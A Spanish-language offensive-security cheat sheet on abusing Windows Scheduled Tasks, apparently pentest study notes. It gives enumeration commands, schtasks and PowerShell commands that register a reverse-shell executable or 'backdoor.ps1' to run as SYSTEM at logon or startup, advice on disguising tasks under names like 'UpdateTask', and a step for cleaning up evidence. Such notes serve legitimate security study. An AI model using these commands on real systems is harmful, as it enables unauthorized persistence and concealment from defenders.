# Scheduled Tasks como Vector de Ataque

## ✨ Concepto

Las *Scheduled Tasks* (Tareas Programadas) en Windows permiten ejecutar programas de forma automática en un horario definido, al iniciar sesión o cuando ocurre un evento. Los atacantes pueden abusarlas para:

* Persistencia (ej. ejecutar un payload al reiniciar).
* Escalada de privilegios (ej. ejecutar como SYSTEM).
* Movimiento lateral (ej. crear tareas en otras máquinas).
* Ejecución arbitraria (bypass de restricciones por UAC o AppLocker).

## ⚖️ Requisitos comunes

* Permisos para crear/modificar tareas (usuario con privilegios).
* Acceso a servicios de programación (Task Scheduler o schtasks.exe).
* Si es remoto: acceso DCOM/WinRM/SMB + privilegios.

## ⚛️ Flujo de Ataque (Local)

1. **Enumerar tareas existentes** → identificar tareas vulnerables o con configuración insegura.
2. **Modificar tarea existente** o **crear una nueva** que ejecute payload.
3. **Asegurar persistencia** o ejecutar tarea manualmente.
4. **Limpiar evidencia si es necesario**.

## 🕹️ Comandos y herramientas ─ Enumeración

### PowerShell

```powershell
# Todas las tareas programadas
Get-ScheduledTask | Select TaskName, TaskPath, State

# Detalles de una tarea
Get-ScheduledTask -TaskName "NombreTarea" | Get-ScheduledTaskInfo

# Tareas creadas por el usuario
Get-ScheduledTask | Where {$_.Principal.UserId -notlike "NT AUTHORITY*"}

# Comprobar la acción que ejecuta una tarea
Get-ScheduledTask | ForEach-Object {
  $_.Actions | Select-Object Execute, Arguments
}
```

### CMD

```cmd
schtasks /query /fo LIST /v > tareas.txt
```

### Sysinternals

* **Autoruns**: Ver tareas automáticas.
* **AccessChk**: Ver permisos sobre el binario que ejecuta la tarea.

## ⚒️ Ejecución / Abuso

### Crear tarea (CMD)

```cmd
schtasks /create /tn "Update" /tr "C:\Temp\rev.exe" /sc onlogon /rl highest /ru SYSTEM
```

### Ejecutar tarea manualmente

```cmd
schtasks /run /tn "Update"
```

### Crear tarea en PowerShell

```powershell
$action = New-ScheduledTaskAction -Execute "C:\Temp\rev.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "Update" -Action $action -Trigger $trigger -RunLevel Highest -User "SYSTEM"
```

## 🔧 Herramientas

* `schtasks.exe` (integrado en Windows)
* `PowerShell` (módulos: ScheduledTasks)
* [WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn) (automatiza abuso de tareas)
* [Seatbelt](https://github.com/GhostPack/Seatbelt): enumera tareas sospechosas
* `Autoruns` / `AccessChk` (Sysinternals)
* `Task Scheduler GUI` (`taskschd.msc`)

## 🔒 Persistencia ejemplo

```powershell
# Al iniciar el sistema, ejecutar backdoor como SYSTEM
schtasks /create /tn "WinUpdate" /tr "C:\Tools\backdoor.ps1" /sc onstart /ru SYSTEM /rl HIGHEST
```

## 💡 Consejos

* Busca tareas que ejecutan binarios en rutas donde puedes escribir.
* Verifica tareas que se ejecutan como SYSTEM pero fueron creadas por usuarios bajos.
* Algunas tareas con nombre como *UpdateTask*, *Cleanup*, *Telemetry* pueden ser camufladas fácilmente.
* Usa `AccessChk` para ver si puedes modificar el ejecutable o la tarea misma.

---
